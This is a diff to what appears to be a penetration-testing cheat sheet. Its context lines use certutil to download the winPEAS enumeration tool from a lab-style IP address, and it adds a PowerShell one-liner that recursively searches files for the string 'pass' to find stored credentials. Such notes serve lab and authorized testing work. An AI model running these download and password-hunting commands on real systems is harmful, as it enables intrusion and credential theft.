@@ -121,3 +121,11 @@ cmd /c certutil.exe -urlcache -split -f http://10.10.14.28/winPEAS.exe
 # CMD
 certutil.exe -urlcache -split -f http://10.10.14.28/winPEAS.exe
 certutil -urlcache -split -f http://10.10.14.28/winPEAS.exe
+
+==============================================================================
+[+] Search Patterns
+==============================================================================
+# Powershell
+Get-ChildItem -Recurse | Select-String "pass" -List | Select Path
+
+
